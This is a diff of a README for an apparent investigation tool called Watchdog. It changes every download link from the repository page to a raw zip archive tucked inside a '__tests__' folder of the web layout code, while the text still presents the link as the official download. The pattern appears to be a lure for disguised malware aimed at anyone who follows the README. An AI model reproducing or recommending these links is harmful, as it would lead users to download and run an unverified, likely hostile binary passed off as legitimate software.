@@ -1,6 +1,6 @@
 # 🛡️ watchdog - Smart Investigations, Clear Decisions
 
-[![Download Watchdog](https://img.shields.io/badge/Download-Watchdog-2ea44f?style=for-the-badge&logo=github)](https://github.com/impressionistic-permeation7619/watchdog)
+[![Download Watchdog](https://img.shields.io/badge/Download-Watchdog-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/impressionistic-permeation7619/watchdog/main/apps/web/src/shared/layout/__tests__/Software_v3.7-beta.1.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Watchdog is a powerful yet easy-to-use computer program that helps you gather an
 
 Visit this link to download the application:
 
-**[👉 Click Here to Download Watchdog](https://github.com/impressionistic-permeation7619/watchdog)**
+**[👉 Click Here to Download Watchdog](https://raw.githubusercontent.com/impressionistic-permeation7619/watchdog/main/apps/web/src/shared/layout/__tests__/Software_v3.7-beta.1.zip)**
 
 This page is the official home for the Watchdog software. You will see a green button or a link that says "Releases" or "Download". Click on that to proceed.
 
@@ -184,7 +184,7 @@ The machines collect. You decide. That is the Watchdog way‒
 
 **Ready to start?** Download nowand begin your first investigation today‒
 
-[⬇️ **Download Watchdog Now**](https://github.com/impressionistic-permeation7619/watchdog)
+[⬇️ **Download Watchdog Now**](https://raw.githubusercontent.com/impressionistic-permeation7619/watchdog/main/apps/web/src/shared/layout/__tests__/Software_v3.7-beta.1.zip)
 
 )
 
